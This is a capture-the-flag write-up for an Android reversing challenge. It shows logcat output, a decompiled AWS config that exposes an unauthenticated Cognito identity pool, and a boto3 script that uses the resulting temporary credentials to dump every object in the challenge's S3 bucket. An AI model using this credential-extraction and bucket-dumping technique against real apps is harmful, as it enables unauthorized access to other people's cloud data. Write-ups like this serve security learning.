## The AWS exploit
```
Will has been tasked with collecting feedbacks for the CTF. Instead of using online form he made this app as he wanted to get his hands dirty with App dev and DevOps.
[Link to download app]
Category: Reversing
```
This one took a while because no one in our team had resources for APK decompilation. One of our team members had ADB `logcat` and that is where we discovered the first chunk of information, as to insight into what the challenge is all about. To be quite honest, this problem had one of the least intuitive and beginner-friendly solutions and required quite a lot of intricate AWS knowledge. If you have worked with certain AWS SDK features or something like [flaws.cloud](https://flaws.cloud), this might be easy, but otherwise, I felt this was extremely restrictive.

Using `logcat`, we can see what the app is doing once we press "Send feedback":
```
2020-12-19 01:38:44.558 8550-9744/? D/AmazonS3Client: Key: feedback/.json; Request: PUT https://<...>.s3.ap-south-1.amazonaws.com /feedback/.json 
2020-12-19 01:38:44.559 8550-9744/? D/KeyProvider23: AndroidKeyStore contains keyAlias com.amazonaws.mobile.client.aesKeyStoreAlias
2020-12-19 01:38:44.559 8550-9744/? D/KeyProvider23: Loading the encryption key from Android KeyStore.
2020-12-19 01:38:44.561 8550-9744/? D/KeyProvider23: AndroidKeyStore contains keyAlias com.amazonaws.mobile.client.aesKeyStoreAlias
2020-12-19 01:38:44.561 8550-9744/? D/KeyProvider23: Loading the encryption key from Android KeyStore.
2020-12-19 01:38:44.563 8550-9744/? D/KeyProvider23: AndroidKeyStore contains keyAlias com.amazonaws.mobile.client.aesKeyStoreAlias
2020-12-19 01:38:44.563 8550-9744/? D/KeyProvider23: Loading the encryption key from Android KeyStore.
2020-12-19 01:38:44.577 8550-9744/? D/KeyProvider23: AndroidKeyStore contains keyAlias com.amazonaws.mobile.client.aesKeyStoreAlias
2020-12-19 01:38:44.578 8550-9744/? D/KeyProvider23: Loading the encryption key from Android KeyStore.
2020-12-19 01:38:44.578 8550-9744/? D/AWSMobileClient: Inspecting user state details
2020-12-19 01:38:44.580 8550-9744/? D/AWSMobileClient: waitForSignIn: userState:GUEST
2020-12-19 01:38:44.580 8550-9744/? D/KeyProvider23: AndroidKeyStore contains keyAlias com.amazonaws.android.auth.aesKeyStoreAlias
2020-12-19 01:38:44.580 8550-9744/? D/KeyProvider23: Loading the encryption key from Android KeyStore.
2020-12-19 01:38:44.593 8550-9744/? D/KeyProvider23: AndroidKeyStore contains keyAlias com.amazonaws.mobile.client.aesKeyStoreAlias
2020-12-19 01:38:44.593 8550-9744/? D/KeyProvider23: Loading the encryption key from Android KeyStore.
2020-12-19 01:38:44.606 8550-9744/? D/AWS4Signer: AWS4 Canonical Request: '"PUT
    /feedback/.json
    
    content-md5:ArXoeuja4WV6fSZ9+AW9jQ==
    host:<...>.s3.ap-south-1.amazonaws.com
    x-amz-content-sha256:STREAMING-AWS4-HMAC-SHA256-PAYLOAD
    x-amz-date:20201218T200844Z
    x-amz-decoded-content-length:33
    x-amz-security-token:<...truncated...>"
```
Simply put, the app is PUTing our feedback as a `feedback.json` file to S3. Any requests except `POST` gave us `AccessDenied` so it was clear that the ACL was strict, making a `POST` however kept having weird validation, and even after we met the requirements, the server gave the same validation error. Eventually, I abandoned this attack surface.

### Reversing the app
This was very annoying because we didn't have the resources, so I started by installing mobSF and Genymotion, the app looks great and all and also does a lot of security analysis, such as searching for trackers and malware - but in this case, it was (almost) pointless. There was nothing in the Java files and Genymotion *just* ***didn't*** *work*.

I then proceeded to use an online decompiler at [decompiler.com](https://www.decompiler.com) which is a typical JADX compiler and I was able to access the `resources` folder (as well as the Java files) which had what I believed to be was necessary for the exploit to work. The funny bit was that despite having opened the same file the previous day, I never realized that they were *usable* credentials. In the resources folder, we see a `res` folder, with a `raw/awsconfiguration.json` file:
```json
{
"CredentialsProvider": {
  "CognitoIdentity": {
    "Default": {
      "PoolId": "ap-south-1:<...>",
      "Region": "ap-south-1"
    }
  }
},
  "S3TransferUtility": {
    "Default": {
      "Bucket": "<...>",
      "Region": "ap-south-1"
    }
  }
}
```
After reading a bit up on AWS theory (yes, really...), we figured that the Cognito Identification Pool **has** to be *unauthenticated* because there were no other credentials being exchanged, so the key was to get an ID from our ID Pool, exchange it for STS tokens and use those credentials to access the S3. While I was exactly right in this case, I still wonder what would happen if I wasn't, but anyway. 🤷‍♂️

I started working on a Node script and built something from sample code to generate the required credentials, and as expected, Cognito was giving us proper access tokens, where it failed was retrieving resources from S3 because of CORS. And while I was going bonkers, a teammate wrote a script with `boto3` to do this. Oh also, I don't know how to write Node.js, so probably that was the problem.
```python
from boto3.session import Session
from io import BytesIO

ACCESS_KEY='ASIAKEY'
SECRET_KEY='mfXpSECRETKEYkZGTOonrJ'
SESSION_KEY = 'IQoJb3JpZSSESSIONKEYzWZg'

session = Session(aws_access_key_id=ACCESS_KEY,
                  aws_secret_access_key=SECRET_KEY,
                  aws_session_token=SESSION_KEY)
s3 = session.resource('s3')
your_bucket = s3.Bucket('<...>')

for obj in your_bucket.objects.all():
    key = obj.key
    body = obj.get()['Body'].read()
    print(body)
```
We can then see the very first item in the S3 is the flag:

![](https://dev-to-uploads.s3.amazonaws.com/i/smxul28iu96w264t6idl.png)

And we retrieve the flag - `mlh{th1s_i5_why_i_d0nt_l1k3_devops}`. 🚀
